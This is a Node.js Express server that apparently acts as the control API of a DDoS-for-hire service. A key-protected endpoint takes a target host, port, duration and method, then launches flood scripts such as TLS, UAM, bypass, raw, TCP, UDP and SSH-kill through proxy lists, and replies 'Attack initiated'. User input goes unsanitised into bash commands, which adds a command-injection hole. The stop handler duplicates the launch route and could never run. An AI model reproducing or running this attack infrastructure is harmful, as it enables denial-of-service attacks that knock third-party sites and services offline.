const express = require('express');
const { spawn } = require('child_process');
const app = express();
const port = 2216;

const methods = {
    PIDORAS: 'pidoras.js',
    FLOOD: 'flood.js',
    TLSHOLD: 'GLORY.js',
    TLS: 'Tls.js',
    NINJA: 'ninja.js',
    BYPASS: 'BYPASS.js',
    CIBI: 'Cibi.js',
    FLOOD: 'flood.js',
    BROWSER: 'browser.js',
    TCP: 'tcp.js',
    HOLD: 'Tls.js',
    RAW: 'raw.js',
    UAM: 'UAM.js',
    TLSV2: 'TLSv2.js',
    UDP: 'udp.c',
    SSHKILL: 'ssh-kill.js',
};

// Daftar proses yang berjalan
const activeProcesses = new Map();

const generateCommand = (method, host, port, time) => {
    switch (method) {
        case 'UAM':
            return `cd /root/api/ && node UAM.js ${host} ${time} 64 4 proxy.txt`;
        case 'TLSHOLD':
            return `cd /root/api/ && node GLORY.js ${host} 3600 64 4 proxy.txt`;
        case 'TLSV2':
            return `cd /root/api/ && node TLSv2.js ${host} ${time} 64 4 proxy.txt`;
        case 'HOLD':
            return `cd /root/api && node Tls.js ${host} 3600 32 2 proxy.txt`;
        case 'TLS':
            return `cd /root/api/ && node Tls.js ${host} ${time} 64 4 proxy.txt`;
        case 'NINJA':
            return `cd /root/api/ && node ninja.js ${host} ${time} 64 4 proxy.txt`;
        case 'BYPASS':
            return `cd /root/api/ && node BYPASS.js ${host} ${time} 4 64 proxy.txt`;
        case 'CIBI':
            return `cd /root/api/ && node Cibi.js ${host} ${time} 64 4 proxy.txt`;
        case 'FLOOD':
            return `cd /root/api/ && node flood.js ${host} ${time} 64 4 proxy.txt`;
        case 'RAW':
            return `cd /root/api/ && node raw.js ${host} ${time} 64 4 proxy.txt`;
        case 'BROWSER':
            return `cd /root/api/ && node browser.js ${host} ${time} 10 proxy.txt`;
        case 'TCP':
            return `cd /root/api/ && node tcp.js ${host} ${port} 5 ${time}`;
        case 'UDP':
            return `cd /root/api/ && ./udp ${host} ${port} 5 ${time}`;
        case 'SSHKILL':
            return `cd /root/api/ && node ssh-kill.js ${host} ${port} ${time}`;
        default:
            return `cd /root/api/ && node ${methods[method]} ${host} ${time}`;
    }
};

app.get('/api/hurricane', (req, res) => {
    const key = req.query.key;
    const host = req.query.host;
    const port = req.query.port;
    const time = req.query.time;
    const method = req.query.method;

    if (key !== 'hurricane') {
        return res.status(401).json({ error: 'Invalid key' });
    }

    if (!methods[method]) {
        return res.status(400).json({ error: 'Unknown method' });
    }

    res.json({
        status: 'Attack initiated',
        host: host,
        port: port,
        time: time,
        method: method,
    });

    const command = generateCommand(method, host, port, time);
    const process = spawn('bash', ['-c', command], { detached: true });

    process.stdout.on('data', (data) => {
        console.log(`Stdout: ${data}`);
    });

    process.stderr.on('data', (data) => {
        console.error(`Stderr: ${data}`);
    });

    process.on('close', (code) => {
        console.log(`Process exited with code ${code}`);
    });

    // Simpan proses yang sedang berjalan
    activeProcesses.set(process.pid, process);
});

app.get('/api/hurricane', (req, res) => {
    const key = req.query.key;

    if (key !== 'hurricane') {
        return res.status(401).json({ error: 'Invalid key' });
    }

    activeProcesses.forEach((process, pid) => {
        process.kill();
        activeProcesses.delete(pid);
    });

    res.json({ status: 'All attacks stopped.' });
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});